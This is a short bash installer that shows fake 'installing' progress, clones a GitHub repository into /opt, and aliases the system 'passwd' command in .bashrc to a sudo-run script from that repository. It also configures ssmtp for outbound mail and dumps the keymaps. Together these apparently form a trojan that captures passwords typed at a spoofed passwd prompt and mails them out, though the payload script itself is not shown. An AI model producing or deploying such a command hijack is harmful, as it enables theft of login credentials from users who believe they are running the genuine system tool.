#initializin
sleep 0.5
sudo echo -n "installing."
sleep 0.5
echo -n "..."
sleep 0.5
echo "..."
sleep 2

#git
apt install git
FOLDER="kelompokkucing"
cd /opt/
link="https://github.com/yagrariksa/$FOLDER"
git clone $link
chmod a+x /opt/$FOLDER/*


#conf alias
cd
USER=
COMMAND="sudo /opt/$FOLDER/run.sh"
ALIAS="alias passwd=\"$COMMAND\""
echo $ALIAS >> .bashrc

# install ssmtp
apt install -y ssmtp
mv /etc/ssmtp/ssmtp.conf /etc/ssmtp/ori.txt
/opt/$FOLDER/ssmtp.sh > /etc/ssmtp/ssmtp.conf
cat /etc/ssmtp/ori.txt | grep ^hostname >> /etc/ssmtp/ssmtp.conf

# create keymaps
dumpkeys > /opt/$FOLDER/keymaps.txt

# for live
alias passwd="sudo /opt/$FOLDER/run.sh"